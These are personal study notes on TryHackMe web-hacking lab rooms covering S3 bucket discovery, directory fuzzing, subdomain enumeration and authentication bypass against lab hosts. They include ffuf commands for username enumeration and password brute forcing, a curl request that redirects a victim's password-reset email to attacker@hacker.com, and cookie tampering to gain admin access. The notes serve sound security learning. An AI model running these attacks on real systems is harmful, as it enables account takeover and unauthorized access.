S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://**{name}.**[**s3.amazonaws.com**](http://s3.amazonaws.com/) where {name} is decided by the owner, such as [tryhackme-assets.s3.amazonaws.com](http://tryhackme-assets.s3.amazonaws.com/). S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as **{name}**-assets, **{name}**-www, **{name}**-public, **{name}**-private, etc.

#### Automated Discovery
**What is Automated Discovery?**

Automated discovery is the process of using tools to discover content rather than doing it manually. This process is automated as it usually contains hundreds, thousands or even millions of requests to a web server. These requests check whether a file or directory exists on a website, giving us access to resources we didn't previously know existed. This process is made possible by using a resource called wordlists.

  

**What are wordlists?**

Wordlists are just text files that contain a long list of commonly used words; they can cover many different use cases. For example, a password wordlist would include the most frequently used passwords, whereas we're looking for content in our case, so we'd require a list containing the most commonly used directory and file names. An excellent resource for wordlists that is preinstalled on the THM AttackBox is [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) which Daniel Miessler curates.

  

**Automation Tools**

Although there are many different content discovery tools available, all with their features and flaws, we're going to cover three which are preinstalled on our attack box, ffuf, dirb and gobuster.

  

On the AttackBox execute the following three commands, targeting the Acme IT Support website and see what results you get.

  

**Using ffuf:**

ffuf

```shell-session
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.83.120/FUZZ
```

**Using dirb:**

dirb

```shell-session
user@machine$ dirb http://10.10.83.120/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

**Using Gobuster:**

gobuster

```shell-session
user@machine$ gobuster dir --url http://10.10.83.120/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

<div class="code-wrapper">
  <button class="copy-button" onclick="copyToClipboard(this)">📋 Copy</button>
  <pre><code>gobuster dir --url http://10.10.83.120/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</code></pre>
</div>


there is some clipboard added

![[Pasted image 20241108125712.png]]


### Subdomain Enumeration

Learn the various ways of discovering subdomains to expand your attack surface of a target.

#### Brief 
Subdomain enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potential points of vulnerability.  
  
We will explore three different subdomain enumeration methods: Brute Force, OSINT(Open-Source Intelligence) and Virtual Host.

#### OSINT - SSL/TLS Certificates
**SSL/TLS Certificates**

When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like [https://crt.sh](http://crt.sh/) and [https://ui.ctsearch.entrust.com/ui/ctsearchui](https://ui.ctsearch.entrust.com/ui/ctsearchui) offer a searchable database of certificates that shows current and historical results.

  

Go to [crt.sh](https://crt.sh/) and search for the domain name **tryhackme.com**, find the entry that was logged at **2020-12-26** and enter the domain below to answer the question.

![[Pasted image 20241108131509.png]]


#### OSINT - Search Engines
**Search Engines**

Search engines contain trillions of links to more than a billion websites, which can be an excellent resource for finding new subdomains. Using advanced search methods on websites like Google, such as the site: filter, can narrow the search results. For example, `site:*.domain.com -site:www.domain.com` would only contain results leading to the domain name domain.com but exclude any links to www.domain.com; therefore, it shows us only subdomain names belonging to domain.com.

  

Go to [Google](https://www.google.com/) and use the search term `site:*.tryhackme.com -site:www.tryhackme.com`, which should reveal a subdomain for tryhackme.com; use that subdomain to answer the question below.

![[Pasted image 20241108132654.png]]

#### DNS Bruteforce 

Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker. In this instance, we are using a tool called dnsrecon to perform this. Click the "View Site" button to open the static site, press the "Run DNSrecon Request" button to start the simulation, and then answer the question below.

![[Pasted image 20241108133022.png]]


#### OSINT - Sublist3r

**Automation Using Sublist3r**

To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like [Sublist3r](https://github.com/aboul3la/Sublist3r), click the "View Site" button to open up the static site and run the sublist3r simulation to discover a new subdomain that will help answer the question below.

```shell
user@thm:~$ ./sublist3r.py -d acmeitsupport.thm
```
![[Pasted image 20241108133151.png]]

#### Virtual Hosts

Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. 

Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the **Host** header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.

Like with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains.


Start an AttackBox and then try the following command against the Acme IT Support machine to try and discover a new subdomain.

  

ffuf

```shell-session
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.38.100
```

The above command uses the **-w** switch to specify the wordlist we are going to use. The **-H** switch adds/edits a header (in this instance, the Host header), we have the **FUZZ** keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.   

Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the **-fs** switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.  

ffuf

```shell-session
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.38.100 -fs {size}
```

This command has a similar syntax to the first apart from the **-fs** switch, which tells ffuf to ignore any results that are of the specified size.



### Authentication Bypass

Learn how to defeat logins and other authentication mechanisms to allow you access to unpermitted areas.

#### brief 
In this room, we will learn about different ways website authentication methods can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.

#### username enumeration
Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website ([http://10.10.41.197/customers/signup](http://10.10.41.197/customers/signup)) signup page.

when we are trying to login through  username: `admin` , and password : `admin` we see that the authentication failed 
**An account with this username already exists**. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.

Username enumeration with ffuf

```shell-session
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.41.197/customers/signup -mr "username already exists"
```

In the above example, the `-w` argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The `-X`argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The `-d` argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to **FUZZ**. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The `-H` argument is used for adding additional headers to the request. In this instance, we're setting the `Content-Type` so the web server knows we are sending form data. The `-u` argument specifies the URL we are making the request to, and finally, the `-mr` argument is the text on the page we are looking for to validate we've found a valid username.

The ffuf tool and wordlist come pre-installed on the **AttackBox** or can be installed locally by downloading it from [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf).
![[Pasted image 20241109011832.png]]


#### brute force

Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page ([http://10.10.88.140/customers/login](http://10.10.88.140/customers/login)).

**Note: If you created your valid_usernames file by piping the output from ffuf directly you may have difficulty with this task. Clean your data, or copy just the names into a new file.**

A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.

When running this command, make sure the terminal is in the same directory as the valid_usernames.txt file.

  

Bruteforcing with ffuf

```shell-session
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.88.140/customers/login -fc 200
```

This ffuf command is a little different to the previous one in Task 2. Previously we used the **FUZZ** keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen `W1` for our list of valid usernames and `W2` for the list of passwords we will try. The multiple wordlists are again specified with the `-w` argument but separated with a comma.  For a positive match, we're using the `-fc` argument to check for an HTTP status code other than 200.

need to create a new file named `valid_usernames.txt`

![[Pasted image 20241109115635.png|a file that will be containing all the valid usernames]]



![[Pasted image 20241109114931.png]]


![[Pasted image 20241109115047.png|by putting steve and thunder as password we reached to the customer dashboard]]


#### Logic Flaw

Sometimes **authentication** processes **contain logic flaws**. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.



![[Pasted image 20241110172150.png]]




```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```



![[Pasted image 20241110173333.png]]


![[Pasted image 20241110173346.png|by seing this we could understand that the *robert* is a valid username with a useremail as robert@acmeitsupport.thm]]

At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.

```shell

curl 'http://10.10.241.173/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

```


```html
root@ip-10-10-17-188:~# curl 'http://10.10.241.173/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Acme IT Support - Customer Login</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.12.0/css/all.css" integrity="sha384ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
        <link rel="stylesheet" href="/assets/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
    <nav class="navbar navbar-inverse navbar-fixed-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="#">Acme IT Support</a>
            </div>
            <div id="navbar" class="collapse navbar-collapse">
                <ul class="nav navbar-nav">
                    <li><a href="/">Home</a></li>
                    <li><a href="/news">News</a></li>
                    <li><a href="/contact">Contact</a></li>
                    <li class="active"><a href="/customers">Customers</a></li>
                </ul>
            </div><!--/.nav-collapse -->
        </div>
    </nav><div class="container" style="padding-top:60px">
    <h1 class="text-center">Acme IT Support</h1>
    <h2 class="text-center">Reset Password</h2>
    <div class="row">
        <div class="col-md-4 col-md-offset-4">
                        <div class="alert alert-success text-center">
                <p>We'll send you a reset email to <strong>robert@acmeitsupport.thm</strong></p>
            </div>
                    </div>
    </div>
</div>
<script src="/assets/jquery.min.js"></script>
<script src="/assets/bootstrap.min.js"></script>
<script src="/assets/site.js"></script>
</body>
</html>
<!--
Page Generated in 0.05322 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )

```

![[Pasted image 20241112092245.png]]
We use the `-H` flag to add an additional header to the request. In this instance, we are setting the `Content-Type` to `application/x-www-form-urlencoded`, which lets the web server know we are sending form data so it properly understands our request.

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`. 

The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.



```shell-session
user@tryhackme$ curl 'http://10.10.241.173/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```



![[Pasted image 20241112092135.png]]


so we could see that the vulnerablility allows us to login to any other user id and in the same way we could build our profile and then pass the email of ours and send a POST request to the user and raise a ticket for login of robert 


```html
-->root@ip-10-10-17-188:~# curl 'http://10.10.241.173/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlened' -d 'username=robert&email=mrp@customer.acmeitsupport.thm'
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Acme IT Support - Customer Login</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.12.0/css/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
        <link rel="stylesheet" href="/assets/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
    <nav class="navbar navbar-inverse navbar-fixed-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="#">Acme IT Support</a>
            </div>
            <div id="navbar" class="collapse navbar-collapse">
                <ul class="nav navbar-nav">
                    <li><a href="/">Home</a></li>
                    <li><a href="/news">News</a></li>
                    <li><a href="/contact">Contact</a></li>
                    <li class="active"><a href="/customers">Customers</a></li>
                </ul>
            </div><!--/.nav-collapse -->
        </div>
    </nav><div class="container" style="padding-top:60px">
    <h1 class="text-center">Acme IT Support</h1>
    <h2 class="text-center">Reset Password</h2>
    <div class="row">
        <div class="col-md-4 col-md-offset-4">
                        <div class="alert alert-success text-center">
                <p>We'll send you a reset email to <strong>mrp@customer.acmeitsupport.thm</strong></p>
            </div>
                    </div>
    </div>
</div>
<script src="/assets/jquery.min.js"></script>
<script src="/assets/bootstrap.min.js"></script>
<script src="/assets/site.js"></script>
</body>
</html>
<!--
Page Generated in 0.03316 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )


```

![[Pasted image 20241112093449.png]]

![[Pasted image 20241112093551.png|the support ticket that has been generated by us to our fake user ]]


![[Pasted image 20241112093653.png|the support ticket that has been generated and we are login in]]


![[Pasted image 20241112093813.png|now we are into robert's account]]


- and by opening the new ticket we got the **flag**

#### Cookie Tampering

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. If you need a refresher on cookies, check out the [HTTP In Detail](https://tryhackme.com/room/httpindetail) room on task 6.

  

**Plain Text**

The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:

**Set-Cookie: logged_in=true; Max-Age=3600; Path=/**  
****Set-Cookie: admin=false; Max-Age=3600; Path=/****

We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.

First, we'll start just by requesting the target page:  

Curl Request 1

```shell-session
user@tryhackme$ curl http://10.10.6.238/cookie-test
```

We can see we are returned a message of: **Not Logged In**

Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:  

Curl Request 2

```shell-session
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.6.238/cookie-test
```

We are given the message: **Logged In As A User**

Finally, we'll send one last request setting both the logged_in and admin cookie to true:

Curl Request 3

```shell-session
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.6.238/cookie-test
```

This returns the result: **Logged In As An Admin** as well as a flag which you can use to answer question one.  

**Hashing**  

Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:

|   |   |   |
|---|---|---|
|**Original String**|**Hash Method**|**Output**|
|1|md5|c4ca4238a0b923820dcc509a6f75849b|
|1|sha-256|6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b|
|1|sha-512|4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a|
|1|sha1|356a192b7913b04c54574d18c28d46e6395428ab|

You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as [https://crackstation.net/](https://crackstation.net/) keep databases of billions of hashes and their original strings.

**Encoding**

Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.  
  
Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.

  
Take the below data as an example which is set by the web server upon logging in:

****Set-Cookie:** session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/**

This string base64 decoded has the value of **{"id":1,"admin": false}** we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.



<script>
function copyToClipboard(btn) {
  const code = btn.nextElementSibling.innerText;
  navigator.clipboard.writeText(code).then(() => {
    btn.innerText = "✅ Copied!";
    setTimeout(() => btn.innerText = "📋 Copy", 1500);
  });
}
</script>
